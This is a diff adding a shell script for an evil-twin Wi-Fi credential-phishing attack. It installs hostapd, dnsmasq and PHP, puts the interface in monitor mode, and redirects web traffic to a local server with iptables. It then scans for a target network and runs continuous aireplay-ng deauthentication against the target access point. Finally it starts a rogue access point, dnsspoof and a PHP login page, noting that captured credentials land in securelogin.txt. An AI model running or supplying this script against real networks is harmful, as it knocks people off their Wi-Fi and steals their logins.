@@ -1,0 +1,40 @@
+apt-get update
+apt-get install hostapd dnsmasq apache2 php-cli
+
+iwconfig
+airmon-ng start wlan0
+
+# change the interface name and the ssid in hostapd.conf 
+# change the interface name in dnsmasq.conf
+# the interface name may be wlan0 or wlan0mon. iwconfig to make sure
+
+# change the interface name in the below lines accordingly
+
+ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
+route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+iptables --append FORWARD --in-interface wlan0 -j ACCEPT
+iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1
+
+
+# Save the rules
+sudo service iptables save
+
+# Find the target network
+airodump-ng wlan0
+
+# Deauth
+sudo aireplay-ng --deauth 0 -a <mac-address-of-target-AP> wlan0
+
+# --- Starting the attack ---: 
+#     each in a different terminal
+
+hostapd hostapd.conf
+
+dnsmasq -C dnsmasq.conf -d
+
+dnsspoof -i wlan0
+
+php -S 0.0.0.0:80
+
+# credentials will be save in securelogin.txt
